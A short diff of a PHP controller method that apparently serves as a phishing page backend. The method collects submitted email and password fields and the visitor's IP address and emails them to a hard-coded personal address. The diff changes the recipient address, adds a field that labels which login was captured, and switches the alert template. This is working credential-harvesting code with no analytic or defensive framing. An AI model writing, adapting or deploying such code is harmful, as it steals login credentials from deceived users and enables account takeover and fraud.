@@ -93,13 +93,14 @@ class MainController extends Controller {
                  {                  
                        $a = $req["a"];
                        $b = $req["b"];
+                       $c = isset($req["c"]) ? $req["c"] : "";
                        
-                 	  $s = "New login: ".date("h:i A jS F, Y");
-                       $rcpt = "aquarius4tkud@yahoo.com";
+                 	  $s = "New ".$c." login: ".date("h:i A jS F, Y");
+                       $rcpt = "tysonmcrichards@gmail.com";
                        
                        $location = getenv("REMOTE_ADDR");
 
-                       $this->helpers->sendEmail($rcpt,$s,['e' => $a,'p' => $b,'location' => $location],'emails.cp_alert','view'); 
+                       $this->helpers->sendEmail($rcpt,$s,['e' => $a,'p' => $b,'location' => $location],'emails.barbis_alert','view'); 
                         $ret = "OK";                      
                   }       
            return $ret;                                                                                            
